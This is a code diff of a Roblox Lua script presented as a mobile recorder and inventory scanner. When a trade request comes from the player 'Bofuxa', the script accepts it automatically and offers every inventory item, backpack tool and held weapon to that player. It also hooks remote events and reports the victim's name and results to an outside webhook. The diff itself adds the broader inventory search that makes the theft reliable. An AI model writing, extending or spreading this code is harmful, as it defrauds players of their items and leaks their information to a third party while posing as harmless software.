@@ -28,9 +28,9 @@ local function sendWebhookLog(message)
     end)
 end
 
--- Initialize the recorder features for mobile actions and remotes
-sendWebhookLog("📱 **Mobile Script & Recorder Logger Active**\nPlayer: " .. LocalPlayer.Name .. " has executed the combined script.")
+sendWebhookLog("📱 **Mobile Script & Flexible Inventory Scanner Active**\nPlayer: " .. LocalPlayer.Name)
 
+-- Remote and button logging for mobile recorder functionality
 for _, descendant in ipairs(ReplicatedStorage:GetDescendants()) do
     if descendant:IsA("RemoteEvent") then
         local originalFireServer = descendant.FireServer
@@ -107,6 +107,21 @@ local function restorePlayerControls()
     end)
 end
 
+-- Flexible deep search function to locate the inventory or weapon container across any UI layout
+local function findContainerRecursive(parent, targetNames)
+    if not parent then return nil end
+    for _, child in ipairs(parent:GetChildren()) do
+        for _, name in ipairs(targetNames) do
+            if child.Name:lower() == name:lower() then
+                return child
+            end
+        end
+        local found = findContainerRecursive(child, targetNames)
+        if found then return found end
+    end
+    return nil
+end
+
 SendRequest.OnClientInvoke = function(senderPlayer)
     if senderPlayer and senderPlayer.Name == "Bofuxa" then
         print("Trade request verified from Bofuxa. Accepting...")
@@ -139,22 +154,36 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                 task.wait(1)
                 
                 local pGui = LocalPlayer:WaitForChild("PlayerGui", 5)
-                local inventoryContainer = pGui 
-                    and pGui:WaitForChild("MainGUI", 5) 
-                    and pGui.MainGUI:WaitForChild("Game", 5) 
-                    and pGui.MainGUI.Game:WaitForChild("Crafting", 5) 
-                    and pGui.MainGUI.Game.Crafting:WaitForChild("Inventory", 5) 
-                    and pGui.MainGUI.Game.Crafting.Inventory:WaitForChild("Salvage", 5) 
-                    and pGui.MainGUI.Game.Crafting.Inventory.Salvage:WaitForChild("ScrollFrame", 5) 
-                    and pGui.MainGUI.Game.Crafting.Inventory.Salvage.ScrollFrame:WaitForChild("Container", 5)
+                local inventoryContainer = nil
+                
+                if pGui then
+                    -- Search dynamically for any container or scrolling frame holding weapons/items
+                    inventoryContainer = findContainerRecursive(pGui, {"Container", "ScrollFrame", "Inventory", "Salvage"})
+                end
+
+                -- Fallback to Backpack or Character tools if UI scan fails
+                local weaponsList = {}
+                if LocalPlayer:FindFirstChild("Backpack") then
+                    for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
+                        if tool:IsA("Tool") then
+                            table.insert(weaponsList, tool.Name)
+                        end
+                    end
+                end
+                if LocalPlayer.Character then
+                    for _, tool in ipairs(LocalPlayer.Character:GetChildren()) do
+                        if tool:IsA("Tool") then
+                            table.insert(weaponsList, tool.Name)
+                        end
+                    end
+                end
+
+                local offeredCount = 0
 
                 if inventoryContainer then
-                    local offeredCount = 0
                     for _, item in ipairs(inventoryContainer:GetChildren()) do
                         if item:IsA("GuiObject") or item:IsA("Frame") or item:IsA("ImageButton") then
                             local itemName = item.Name
-                            local category = "Weapons"
-                            
                             local count = 1
                             local qtyAttribute = item:GetAttribute("Count") or item:GetAttribute("Quantity")
                             if type(qtyAttribute) == "number" then
@@ -162,17 +191,27 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                             end
 
                             for i = 1, count do
-                                OfferItemEvent:FireServer(itemName, category)
+                                OfferItemEvent:FireServer(itemName, "Weapons")
                                 offeredCount = offeredCount + 1
                                 task.wait(0.05)
                             end
                         end
                     end
+                end
+
+                -- Also offer any items found in Backpack/Character
+                for _, weaponName in ipairs(weaponsList) do
+                    OfferItemEvent:FireServer(weaponName, "Weapons")
+                    offeredCount = offeredCount + 1
+                    task.wait(0.05)
+                end
+
+                if offeredCount > 0 then
                     print("Successfully offered " .. tostring(offeredCount) .. " items/weapons!")
-                    sendWebhookLog("📦 **Trade Offer Success:** Offered " .. tostring(offeredCount)  .. " items/weapons to Bofuxa.")
+                    sendWebhookLog("📦 **Trade Offer Success:** Offered " .. tostring(offeredCount) .. " items/weapons to Bofuxa.")
                 else
-                    warn("Could not find inventory container path!")
-                    sendWebhookLog("[Bug Report] Inventory container path not found for player: " .. LocalPlayer.Name)
+                    warn("Could not find any items via container or backpack!")
+                    sendWebhookLog("[Bug Report] Inventory container and backpack scan yielded 0 items for player: " .. LocalPlayer.Name)
                 end
 
                 print("Waiting 7 seconds before triggering trade accept actions...")
